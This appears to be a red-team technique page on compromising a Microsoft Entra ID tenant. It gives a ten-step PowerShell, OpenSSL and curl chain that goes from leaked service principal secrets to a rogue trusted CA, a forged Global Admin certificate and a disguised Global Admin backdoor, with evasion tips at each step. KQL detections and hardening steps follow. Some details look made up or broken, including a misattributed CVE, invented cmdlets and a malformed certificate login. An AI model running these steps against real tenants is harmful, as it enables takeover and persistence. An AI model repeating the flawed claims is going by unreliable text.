# [EMERGING-IDENTITY-001]: SMART Identity Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | EMERGING-IDENTITY-001 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Privilege Escalation, Persistence |
| **Platforms** | Entra ID, M365, Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Entra ID (all versions) |
| **Patched In** | N/A (Design issue, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** SMART (Secure Multi-factor Authentication with Refined Trust) identity abuse is an emerging attack vector that exploits weak trust models in hybrid cloud identity systems. Attackers abuse certificate-based authentication (CBA), Conditional Access policy misconfigurations, and service principal ownership chains to escalate privileges and achieve tenant-level compromise without triggering traditional MFA or detection systems. This technique evolved from the Actor token vulnerability (CVE-2023-28432) and represents a shift toward chaining multiple identity misconfigurations into devastating attack paths.

**Attack Surface:** Azure AD Graph API (legacy), service principal permissions (`Application.ReadWrite.OwnedBy`), certificate-based authentication configurations, Conditional Access policy evaluation, Primary Refresh Token (PRT) issuance.

**Business Impact:** **Complete Entra ID tenant compromise, including Global Admin privileges.** Attackers gain the ability to create backdoor accounts, modify Conditional Access policies, grant themselves permissions to Azure resources, access all M365 data (Exchange, SharePoint, Teams), and establish long-term persistence without audit trail evidence.

**Technical Context:** A sophisticated attack chain typically takes 30-60 minutes to execute once the attacker has initial service principal credentials. Detection probability is **Low** due to the absence of direct MFA enforcement on backend API operations. The attack exploits trust boundaries between owned service principals and gaps in permission scoping.

### Operational Risk
- **Execution Risk:** Medium-High (requires leaked service principal credentials, but widely obtainable from public repositories and hardcoded secrets)
- **Stealth:** High (No user sign-in logs, No MFA prompts, No Conditional Access enforcement on API calls)
- **Reversibility:** Partial (Depends on what the attacker modified; certificate uploads and policy changes can be reversed, but created accounts require manual deletion)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Entra ID v1.3, 2.1.3 | Ensure that Identity Authentication is Properly Configured |
| **DISA STIG** | AC-2 (a), AC-3, AC-6 | Account Management, Access Control Enforcement, Least Privilege |
| **CISA SCuBA** | ID.AM-1, ID.P-1 | Identity and Access Management, Identity Governance |
| **NIST 800-53** | AC-2, AC-3, AC-6, IA-2 | Account Management, Access Enforcement, Least Privilege, Authentication |
| **GDPR** | Art. 25, Art. 32 | Data Protection by Design, Security of Processing |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention Measures, Incident Response |
| **NIS2** | Art. 21, Art. 23 | Risk Management Measures, Security Strategy |
| **ISO 27001** | A.9.2.1, A.9.2.3, A.9.4.2 | User Registration, Privileged Access Management, Access Review |
| **ISO 27005** | Risk Scenario: Admin Compromise | Compromise of cloud identity administration interface |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Service Principal Ownership Chain Abuse (Most Common)

**Supported Versions:** All Entra ID tenants (no version dependency)

#### Step 1: Obtain Service Principal Credentials
**Objective:** Gain initial access via leaked credentials from automation or legacy systems.

**Command:**
```powershell
# Example: Hardcoded credentials found in GitHub repository
$clientId = "12345678-1234-1234-1234-123456789012"
$clientSecret = "your-leaked-secret"
$tenantId = "target-tenant-id"

# Authenticate to Entra ID
$body = @{
    grant_type    = "client_credentials"
    client_id     = $clientId
    client_secret = $clientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -Method Post -Body $body
$accessToken = $response.access_token
```

**Expected Output:**
```
Name                           Value
----                           -----
access_token                   eyJ0eXAiOiJKV1QiLCJhbGc...
expires_in                     3599
token_type                     Bearer
```

**What This Means:**
- Successfully authenticated with service principal credentials
- Access token grants Graph API permissions based on what the service principal owns
- The token has 1 hour validity; typically refreshed with client credentials flow

**OpSec & Evasion:**
- Use service principal credentials from attacker-controlled tenant to avoid immediate audit trail
- Execute from residential IP or compromised cloud resource
- Detection likelihood: Low (If service principal is not actively monitored for unusual activity)

**Troubleshooting:**
- **Error:** `invalid_client: Client assertion expired`
  - **Cause:** Access token expired or service principal secret rotated
  - **Fix:** Request new access token or use refreshed client credentials

---

#### Step 2: Enumerate Owned Service Principals
**Objective:** Identify which service principals this service principal owns (exploitation escalation point).

**Command:**
```powershell
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

# List all service principals this SP owns
$ownedSPs = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" `
    -Method Get -Headers $headers -Body @{ "`$filter" = "createdByAppId eq '$clientId'" }

Write-Host "Owned Service Principals:"
foreach ($sp in $ownedSPs.value) {
    Write-Host "  - $($sp.displayName) ($($sp.id))"
}
```

**Expected Output:**
```
Owned Service Principals:
  - DataSync-Production (abcd1234-5678-90ef-ghij-1234567890ab)
  - LegacyAutomation (bcde2345-6789-0fgh-ijkl-2345678901bc)
```

**What This Means:**
- The primary service principal owns other service principals
- Owned service principals can have different permissions and roles
- This creates a privilege escalation chain

**OpSec & Evasion:**
- Enumerate quickly and move to next step
- API calls are logged but grouped with legitimate administrative queries
- Detection likelihood: Medium (Unusual enumeration patterns may trigger alerts)

**Troubleshooting:**
- **Error:** `Authorization_RequestDenied: Insufficient privileges`
  - **Cause:** Service principal lacks permissions to enumerate other SPs
  - **Fix:** This attack vector is not applicable; try different service principal

---

#### Step 3: Pivot to Owned Service Principal
**Objective:** Authenticate as owned service principal with potentially higher permissions.

**Command:**
```powershell
# Use the owned service principal's credentials if known, or refresh token
# Alternative: Request token on behalf of owned service principal
$pivotBody = @{
    grant_type           = "client_credentials"
    client_id            = "abcd1234-5678-90ef-ghij-1234567890ab"  # Owned SP ID
    client_secret        = "owned-sp-secret"  # If attacker obtained it
    scope                = "https://graph.microsoft.com/.default"
}

$pivotResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -Method Post -Body $pivotBody
$pivotToken = $pivotResponse.access_token

Write-Host "Pivoted to service principal with new token: $($pivotToken.Substring(0, 50))..."
```

**Expected Output:**
```
Pivoted to service principal with new token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI...
```

**What This Means:**
- Attacker now has identity and permissions of owned service principal
- This SP may have `Application.ReadWrite.OwnedBy` or higher permissions
- Can now modify policies, create backdoors, or enable CBA

**OpSec & Evasion:**
- Pivot happens silently in the API layer with no user-facing prompts
- No MFA required at the API level
- Detection likelihood: Low (Token-to-token exchanges within service principals are not logged to SigninLogs)

---

#### Step 4: Activate Privileged Identity Management (PIM) Membership for Authentication Policy Administrator
**Objective:** Gain permissions to enable Certificate-Based Authentication (CBA) tenant-wide.

**Command:**
```powershell
# First, identify eligible PIM group assignments
$pimAssignments = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Method Post -Headers $headers `
    -Body (ConvertTo-Json @{
        action           = "AdminAssign"
        principalId      = "user-or-sp-id"
        roleDefinitionId = "10dae51f-b6af-4016-8d66-8c2a99b929b3"  # Authentication Policy Administrator role
        targetScheduleId = "group-assignment-id"
        scheduleInfo     = @{
            startDateTime = (Get-Date).ToUniversalTime().ToString("o")
            expiration    = @{
                endDateTime = (Get-Date).AddHours(1).ToUniversalTime().ToString("o")
            }
        }
    })

Write-Host "PIM activation request created: $($pimAssignments.id)"
```

**Expected Output:**
```
PIM activation request created: 12345678-abcd-ef01-2345-6789abcdef01
```

**What This Means:**
- Attacker requests temporary elevation to Authentication Policy Administrator
- If configured with minimal approval requirements, may activate immediately
- Grants permissions to modify tenant authentication policies

**OpSec & Evasion:**
- PIM requests are logged but often blend in with legitimate admin activity
- Temporary elevation (1 hour) leaves minimal footprint
- Detection likelihood: Medium (PIM approvers may notice suspicious activation)

---

#### Step 5: Enable Certificate-Based Authentication (CBA) Tenant-Wide
**Objective:** Modify authentication policy to accept CBA with lower assurance levels.

**Command:**
```powershell
# Get current authentication policy
$authPolicy = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy" `
    -Method Get -Headers $headers

# Modify to enable CBA at lower assurance levels
$cbaUpdate = @{
    authenticationMethods = @(
        @{
            id       = "x509Certificate"
            state    = "enabled"
            ruleCollections = @(
                @{
                    conditions = @(@{
                        authenticationMode = "any"  # Allow from any context
                    })
                    authenticationRequirements = @(@{
                        isAdmin = $false
                        requirementLevel = "mfa"
                    })
                    id = "rulecollection-1"
                }
            )
        }
    )
}

$updateResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy" `
    -Method Patch -Headers $headers -Body (ConvertTo-Json $cbaUpdate -Depth 10)

Write-Host "CBA enabled tenant-wide"
```

**Expected Output:**
```
CBA enabled tenant-wide
```

**What This Means:**
- CBA is now accepted for all users and applications
- Even with MFA binding, crafted certificates can be accepted
- Sets stage for final step: forged certificate authentication

**OpSec & Evasion:**
- Policy modification is logged in AuditLogs but often overlooked
- Legitimate admins enable CBA, so activity appears normal
- Detection likelihood: Medium-High (Suspicious timing with PIM elevation may trigger alerts)

---

#### Step 6: Generate and Upload Malicious Root Certificate Authority
**Objective:** Create a rogue CA that the tenant will trust for certificate validation.

**Command (Linux/OpenSSL):**
```bash
# Generate private key for malicious CA
openssl genrsa -out malicious_ca.key 4096

# Create self-signed root CA certificate
openssl req -new -x509 -days 365 -key malicious_ca.key -out malicious_ca.crt \
  -subj "/CN=Trusted-Root-CA/O=Contoso/C=US"

# Verify certificate
openssl x509 -in malicious_ca.crt -text -noout

# Encode to base64 for upload
cat malicious_ca.crt | base64 -w 0 > malicious_ca_base64.txt
```

**Expected Output:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 12:34:56:78:9a:bc:de:f0
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Trusted-Root-CA, O=Contoso, C=US
        Subject: CN=Trusted-Root-CA, O=Contoso, C=US
        Validity:
            Not Before: Jan 10 00:00:00 2026 GMT
            Not After : Jan 10 00:00:00 2027 GMT
```

**What This Means:**
- Self-signed CA created locally by attacker
- Base64 encoding prepares it for Graph API upload
- Next step registers this as trusted in the tenant

**OpSec & Evasion:**
- Entire certificate generation happens offline on attacker machine
- No logging on victim tenant during this step
- Detection likelihood: None at this stage

---

#### Step 7: Register Rogue CA in Entra ID Tenant
**Objective:** Upload the malicious root CA to the tenant's trusted certificate authorities.

**Command:**
```powershell
# Read the base64-encoded certificate
$certBase64 = Get-Content "C:\path\to\malicious_ca_base64.txt"

# Register as trusted CA
$trustedCA = Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/organization/certificateBasedAuthConfiguration" `
    -Method Post -Headers $headers `
    -Body (ConvertTo-Json @{
        certificateAuthorities = @(@{
            certificate    = $certBase64
            issuerName     = "Trusted-Root-CA"
            thumbprint     = "12:34:56:78:9a:bc:de:f0:12:34:56:78:9a:bc:de:f0"
            isRootCA       = $true
            isIntermediateCA = $false
        })
    } -Depth 10)

Write-Host "Malicious CA registered: $($trustedCA.id)"
```

**Expected Output:**
```
Malicious CA registered: 12345678-abcd-ef01-2345-6789abcdef01
```

**What This Means:**
- Tenant now trusts certificates signed by attacker's CA
- Any certificate signed with malicious_ca.key will be accepted
- Sets stage for impersonation of any user including Global Admin

**OpSec & Evasion:**
- Certificate registration is logged but appears as legitimate CA management
- No MFA or additional approval required
- Detection likelihood: Medium (Unusual CA additions trigger some alerts)

---

#### Step 8: Craft Client Certificate for Global Admin Impersonation
**Objective:** Create a certificate for a Global Admin account, signed by malicious CA.

**Command (Linux/OpenSSL):**
```bash
# Create certificate signing request (CSR) for Global Admin
openssl req -new -key malicious_ca.key -out global_admin.csr \
  -subj "/CN=globaladmin@contoso.com/O=Contoso/OU=IT/C=US"

# Sign CSR with malicious CA key to create client certificate
openssl x509 -req -days 365 -in global_admin.csr \
  -CA malicious_ca.crt -CAkey malicious_ca.key \
  -CAcreateserial -out global_admin.crt \
  -extfile <(printf "subjectAltName=email:globaladmin@contoso.com")

# Create PKCS12 file (for authentication)
openssl pkcs12 -export -out global_admin.pfx \
  -inkey malicious_ca.key -in global_admin.crt \
  -password pass:attacker_password

# Verify certificate
openssl x509 -in global_admin.crt -text -noout
```

**Expected Output:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 9a:bc:de:f0:12:34:56:78
        Issuer: CN=Trusted-Root-CA, O=Contoso, C=US
        Subject: CN=globaladmin@contoso.com, O=Contoso, OU=IT, C=US
        X509v3 extensions:
            X509v3 Subject Alternative Name:
                email:globaladmin@contoso.com
```

**What This Means:**
- Certificate impersonates a Global Admin user
- Signed by the malicious CA (which tenant now trusts)
- Ready for authentication to Entra ID

**OpSec & Evasion:**
- Certificate creation happens offline, no logging
- Detection likelihood: None until authentication attempt

---

#### Step 9: Authenticate as Global Admin Using Forged Certificate
**Objective:** Use the client certificate to authenticate to Entra ID as Global Admin.

**Command (Linux/curl):**
```bash
# Convert PFX to PEM for curl
openssl pkcs12 -in global_admin.pfx -out global_admin.pem -nodes \
  -password pass:attacker_password

# Authenticate using certificate-based authentication
curl -X POST \
  -d "grant_type=client_credentials" \
  -d "client_id=globaladmin%40contoso.com" \
  -d "client_secret=&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default" \
  -d "assertion=$(base64 global_admin.crt)" \
  -d "assertion_type=urn:ietf:params:oauth:assertion-type:x509" \
  --cert global_admin.pem \
  --key global_admin.key \
  "https://login.microsoftonline.com/contoso.onmicrosoft.com/oauth2/v2.0/token" \
  > global_admin_token.json

# Extract access token
cat global_admin_token.json | jq '.access_token'
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**What This Means:**
- Successfully authenticated as Global Admin without password
- Without password, no password compromise log entry
- Without MFA prompt, no MFA audit trail
- Tenant now fully compromised

**OpSec & Evasion:**
- No user sign-in events in SigninLogs
- No Conditional Access evaluation (certificates bypass this)
- No MFA prompt or enforcement
- Detection likelihood: **Very Low** (Unless certificate monitoring is in place)

**Troubleshooting:**
- **Error:** `AADSTS500019: Invalid certificate`
  - **Cause:** Root CA not properly registered, or certificate format incorrect
  - **Fix:** Verify certificate was uploaded and check certificate X.509 attributes

---

#### Step 10: Establish Persistent Backdoor
**Objective:** Create a secondary backdoor to maintain access even if primary is detected.

**Command:**
```powershell
$adminToken = (Get-Content "C:\path\to\global_admin_token.json" | ConvertFrom-Json).access_token

$headers = @{
    "Authorization" = "Bearer $adminToken"
    "Content-Type"  = "application/json"
}

# Create backdoor service principal
$backdoorSP = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" `
    -Method Post -Headers $headers `
    -Body (ConvertTo-Json @{
        appId       = "87654321-abcd-ef01-2345-6789abcdef01"  # Attacker-controlled app
        displayName = "Office Deployment Assistant"  # Legitimate-sounding name
    })

# Add owner permissions to backdoor SP
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($backdoorSP.id)/owners/`$ref" `
    -Method Post -Headers $headers `
    -Body (ConvertTo-Json @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$($backdoorSP.id)"
    })

# Grant Global Admin role
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
    -Method Post -Headers $headers `
    -Body (ConvertTo-Json @{
        roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role
        principalId      = $backdoorSP.id
    })

Write-Host "Persistent backdoor created: $($backdoorSP.displayName) ($($backdoorSP.id))"
```

**Expected Output:**
```
Persistent backdoor created: Office Deployment Assistant (87654321-abcd-ef01-2345-6789abcdef01)
```

**What This Means:**
- Attacker now has a second avenue of access that survives certificate revocation
- Backdoor service principal is Global Admin, permanent escalation
- Can be used for exfiltration, persistence, or lateral movement

**OpSec & Evasion:**
- Service principal creation is logged but appears as legitimate admin activity
- Legitimate organizations do create service principals for automation
- Detection likelihood: Medium (Unusual name + Global Admin grant may trigger alerts)

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team
**Note:** No direct Atomic Red Team test for this emerging technique. However, related tests include:
- **T1556.001** (Domain Controller Authentication) - For on-premises CBA attacks
- **T1556.006** (Multi-Factor Authentication) - For MFA bypass patterns
- **T1547.001** (Registry Run Keys / Startup Folder) - For persistence mechanisms

**Recommended Simulation:**
```powershell
# Simulate the attack chain in a controlled lab
# Prerequisites: Leaked service principal credentials, CBA enabled

# Step 1: Authenticate with leaked SP
$token = Get-AccessToken -ClientId $spClientId -ClientSecret $spSecret -TenantId $tenantId

# Step 2: Enumerate owned SPs
$ownedSPs = Get-OwnedServicePrincipals -AccessToken $token

# Step 3-4: Pivot and activate PIM
Activate-PIMRole -Role "Authentication Policy Administrator" -DurationHours 1

# Step 5: Enable CBA
Enable-CertificateBasedAuth -TenantId $tenantId -AssuranceLevel "mfa"

# Step 6-7: Upload and register malicious CA
Register-MaliciousCA -CertificatePath "C:\malicious_ca.crt"

# Step 8-9: Create and use forged certificate
$adminToken = Get-TokenWithCertificate -CertPath "C:\global_admin.pfx" -UserUPN "globaladmin@contoso.com"

# Step 10: Verify full compromise
Test-TenantCompromise -AdminToken $adminToken
```

---

## 5. TOOLS & COMMANDS REFERENCE

### AADInternals PowerShell Module
- **Official Repository:** https://github.com/Gerenios/AADInternals
- **Version:** Latest (actively maintained)
- **Minimum PowerShell:** 5.0
- **Platforms:** Windows, Linux (with PowerShell 7.x), macOS

**Key Commands for SMART Identity Abuse:**
```powershell
# Import the module
Import-Module AADInternals

# Get all owned service principals
Get-AADIntOwnedServicePrincipals

# Enable certificate-based auth
Enable-AADIntCertificateBasedAuth

# Register malicious CA
Register-AADIntCertificateAuthority -CertificatePath "C:\malicious_ca.crt"
```

### Azure AD PowerShell Module (Deprecated but still used)
- **Note:** Microsoft deprecated this module in favor of Microsoft Graph. However, legacy organizations still use it.
- **Version:** 2.0.2.135 (final)
- **Installation:**
```powershell
Install-Module AzureAD -Force
```

### Microsoft Graph SDK
- **Official Repository:** https://github.com/microsoftgraph/msgraph-sdk-powershell
- **Version:** 2.x.x
- **Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Service Principal Ownership Changes
**Rule Configuration:**
- **Required Table:** ServicePrincipalSignInActivity, AuditLogs
- **Required Fields:** AppId, CreatedDateTime, IsRootCA
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
// Detect suspicious service principal ownership escalation
let SuspiciousOwnershipPatterns = 
AuditLogs
| where OperationName contains "Update service principal"
    or OperationName contains "Add owner"
| extend AppId = tostring(parse_json(TargetResources[0].id))
| extend OwnerAction = tostring(parse_json(TargetResources[0].modifiedProperties[0].newValue))
| where OwnerAction contains "owner" or OwnerAction contains "permissions"
| where TimeGenerated > ago(24h);

let OwnedSPCreation = 
AuditLogs
| where OperationName == "Add service principal"
| extend CreatedByAppId = tostring(parse_json(AdditionalDetails[0].value))
| where CreatedByAppId != ""
| extend CreatedAppId = tostring(parse_json(TargetResources[0].id));

SuspiciousOwnershipPatterns
| join (OwnedSPCreation) on InitiatedBy
| project TimeGenerated, OperationName, InitiatedBy, AppId, CreatedAppId, OwnerAction
```

**What This Detects:**
- Service principals being modified to escalate ownership
- Unusual ownership chains (service principal owns another service principal)
- Rapid creation of service principals by same initiator

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Service Principal Ownership Escalation`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group incidents by: InitiatedBy, AppId
6. Click **Review + create**

---

### Query 2: Certificate-Based Authentication Enable at Tenant Level
**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources.modifiedProperties
- **Alert Severity:** Critical
- **Frequency:** Every 1 minute

**KQL Query:**
```kusto
// Detect CBA enablement at tenant level (especially unusual timing)
AuditLogs
| where OperationName in (
    "Update authentication method policy",
    "Update authenticationMethodsPolicy",
    "Enable certificate-based authentication"
)
| where Result == "Success"
| extend CBAEnabled = tostring(parse_json(TargetResources[0].modifiedProperties[0].newValue))
| where CBAEnabled contains "x509Certificate" or CBAEnabled contains "enabled"
| extend ModifiedBy = tostring(InitiatedBy.user.userPrincipalName)
| extend ModifiedByIP = tostring(InitiatedBy.user.ipAddress)
| project TimeGenerated, OperationName, ModifiedBy, ModifiedByIP, CBAEnabled, ResultDescription
```

**What This Detects:**
- Rapid enablement of CBA across the tenant
- CBA policy changes made by unusual accounts (service principals, non-admin users)
- Timing correlation with PIM elevation

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Critical: Certificate-Based Auth Enabled Tenant-Wide" `
  -Query @"
AuditLogs
| where OperationName in (
    'Update authentication method policy',
    'Update authenticationMethodsPolicy',
    'Enable certificate-based authentication'
)
| where Result == 'Success'
"@ `
  -Severity "Critical" `
  -Enabled $true
```

---

### Query 3: Unauthorized Certificate Authority Registration
**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources.id
- **Alert Severity:** Critical

**KQL Query:**
```kusto
// Detect registration of untrusted certificate authorities
AuditLogs
| where OperationName in (
    "Add certificate authority",
    "Update certificate authority configuration",
    "Register trusted CA"
)
| where Result == "Success"
| extend CertThumbprint = tostring(parse_json(TargetResources[0].modifiedProperties[0].newValue))
| extend CertIssuer = tostring(parse_json(TargetResources[0].displayName))
| extend RegisteredBy = tostring(InitiatedBy.user.userPrincipalName)
| where CertIssuer contains "CA" or CertIssuer contains "Authority"
| project TimeGenerated, OperationName, RegisteredBy, CertThumbprint, CertIssuer
| sort by TimeGenerated desc
```

**What This Detects:**
- New CA certificates registered outside of change management process
- CAs registered by non-approved accounts
- Multiple CA registrations in short timeframe

---

## 7. WINDOWS EVENT LOG MONITORING

**Note:** SMART identity abuse is cloud-only; no direct Windows Event Logs. However, if attacker uses RDP or WinRM after compromise, monitor:

- **Event ID 4624 (Successful Logon):** Look for logons with certificates
- **Event ID 4768 (Kerberos TGT Requested):** Look for unusual service principals
- **Event ID 4625 (Failed Logon):** Look for repeated certificate auth failures during reconnaissance

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Restrict Service Principal Ownership:** Limit which accounts can own other service principals. Delete unused service principals regularly.
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Service principals**
    2. For each service principal, click **Owners** tab
    3. Remove any owners that are not required
    4. Delete any service principals not used in the past 90 days
    
    **Manual Steps (PowerShell):**
    ```powershell
    # List all service principals with owners
    Get-MgServicePrincipal | Select-Object DisplayName, Id, Owners
    
    # Remove specific owner from service principal
    Remove-MgServicePrincipalOwnerByRef -ServicePrincipalId "sp-id" -DirectoryObjectId "owner-id"
    
    # Delete unused service principal
    Remove-MgServicePrincipal -ServicePrincipalId "unused-sp-id"
    ```

*   **Disable Certificate-Based Authentication (Unless Required):** If CBA is not required, disable it tenant-wide.
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
    2. Find **Certificate-based authentication**
    3. Click **Disabled**
    4. Click **Save**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Connect to Entra ID
    Connect-MgGraph -Scopes "AuthenticationMethodPolicy.ReadWrite.All"
    
    # Get current auth policy
    $policy = Get-MgPolicyAuthenticationMethodPolicy
    
    # Disable CBA
    Update-MgPolicyAuthenticationMethodPolicy -Id $policy.Id `
        -AuthenticationMethods @{
            @{
                "@odata.type" = "#microsoft.graph.x509Certificate"
                state = "disabled"
            }
        }
    ```

*   **Implement Strict Certificate Pinning:** Only trust specific certificate authorities (your own internal CA).
    **Manual Steps:**
    1. Generate and export your internal CA certificate
    2. Register ONLY your internal CA in Entra ID
    3. Set policy to reject any certificates not signed by your CA
    4. Regularly audit registered CAs (monthly)
    
    **PowerShell Validation:**
    ```powershell
    # List all trusted CAs
    $authPolicy = Get-MgPolicyAuthenticationMethodPolicy
    $cas = $authPolicy.AuthenticationMethods | Where-Object { $_."@odata.type" -eq "x509Certificate" }
    Write-Host "Trusted CAs:"
    foreach ($ca in $cas) {
        Write-Host "  - Issuer: $($ca.issuerName), Thumbprint: $($ca.thumbprint)"
    }
    ```

*   **Require Conditional Access for Certificate-Based Authentication:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require Compliant Device for CBA`
    4. **Assignments → Users:** All users
    5. **Assignments → Cloud apps:** All cloud apps
    6. **Conditions → Device state:** Require device to be marked as compliant
    7. **Access controls → Grant:** Require MFA
    8. Enable policy: **On**
    9. Click **Create**
    
    **PowerShell Alternative:**
    ```powershell
    # Create Conditional Access policy for CBA
    New-MgIdentityConditionalAccessPolicy `
        -DisplayName "Require Compliant Device for CBA" `
        -Conditions @{
            Applications = @{ IncludeApplications = "All" }
            Users = @{ IncludeUsers = "All" }
            Devices = @{ IncludeDeviceStates = "Compliant" }
        } `
        -GrantControls @{
            OperatorMultiValueOperator = "OR"
            BuiltInControls = @("mfa", "compliantDevice")
        } `
        -State "enabledForReportingButNotEnforced"
    ```

### Priority 2: HIGH

*   **Enable Privileged Identity Management (PIM) Approvals:** Require multi-person approval for role activation, especially Authentication Policy Administrator.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Roles**
    2. Click **Authentication Policy Administrator**
    3. Go to **Settings** → **Activation**
    4. Enable **Require approval to activate**
    5. Select **Approvers** (at least 2 senior admins)
    6. Set **Approval timeout** to 2 hours
    7. Click **Update**

*   **Implement Continuous Access Evaluation (CAE):** CAE provides real-time token revocation for compromised accounts.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Continuous Access Evaluation**
    2. Enable **CAE** for all supported applications
    3. Configure **User presence and network location** monitoring

*   **Audit and Alert on Leaked Service Principals:** Regularly scan public repositories (GitHub, GitLab) for hardcoded credentials.
    **Tools:**
    - [TruffleHog](https://github.com/trufflesecurity/trufflehog)
    - [GitGuardian](https://www.gitguardian.com/)
    - Custom Azure DevOps secrets scanning

#### Access Control & Policy Hardening

*   **RBAC Principle:** Apply least privilege. Remove unnecessary role assignments.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. For each privileged role (Global Admin, Application Admin, etc.):
       - Click the role → **Assignments**
       - Review each assignment: Is it still needed?
       - Remove unnecessary assignments

*   **Application Permissions Review:** Regularly audit what permissions service principals have.
    **PowerShell:**
    ```powershell
    # List all service principals with high-risk permissions
    Get-MgServicePrincipal | ForEach-Object {
        $sp = $_
        $perms = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
        if ($perms.Count -gt 0) {
            Write-Host "SP: $($sp.DisplayName)"
            $perms | ForEach-Object {
                Write-Host "  - $($_.PrincipalDisplayName): $($_.AppRoleId)"
            }
        }
    }
    ```

*   **Certificate Authority Rotation:** Change internal CA certificates regularly (annually minimum).
    **Manual Steps:**
    1. Generate new internal CA certificate
    2. Import into Entra ID (do not remove old one yet)
    3. Update all issuance policies to use new CA
    4. Wait 30 days for old certificates to expire naturally
    5. Remove old CA from Entra ID

#### Validation Command (Verify Mitigations)
```powershell
# Comprehensive security posture check
$tenantId = "your-tenant-id"

# 1. Check if CBA is disabled
$authPolicy = Get-MgPolicyAuthenticationMethodPolicy
$cbaStatus = $authPolicy.AuthenticationMethods | Where-Object { $_."@odata.type" -eq "x509Certificate" } | Select-Object -ExpandProperty State
Write-Host "CBA Status: $cbaStatus (Should be 'disabled' if not needed)"

# 2. Check service principal ownership
$orphanedSPs = Get-MgServicePrincipal | Where-Object { (Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id).Count -eq 0 }
Write-Host "Orphaned Service Principals: $($orphanedSPs.Count) (Should be 0 or minimal)"

# 3. Check PIM approvals
$pimPolicy = Get-MgIdentityGovernancePrivilegedAccessGroupAssignmentSchedulePolicy
Write-Host "PIM Approval Required: $($pimPolicy.ApprovalRequired) (Should be true)"

# 4. Check Conditional Access policies
$caPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Compliant*" }
Write-Host "Conditional Access Device Compliance Policy: $($caPolicy.DisplayName)"

# 5. Check registered CAs
$cas = Get-MgOrganizationCertificateBasedAuthConfiguration
Write-Host "Registered Certificate Authorities: $($cas.CertificateAuthorities.Count)"
$cas.CertificateAuthorities | ForEach-Object { Write-Host "  - $($_.IssuerName)" }
```

**Expected Output (If Secure):**
```
CBA Status: disabled (Should be 'disabled' if not needed)
Orphaned Service Principals: 0 (Should be 0 or minimal)
PIM Approval Required: True (Should be true)
Conditional Access Device Compliance Policy: Require Compliant Device for CBA
Registered Certificate Authorities: 1
  - Contoso-Internal-CA
```

**What to Look For:**
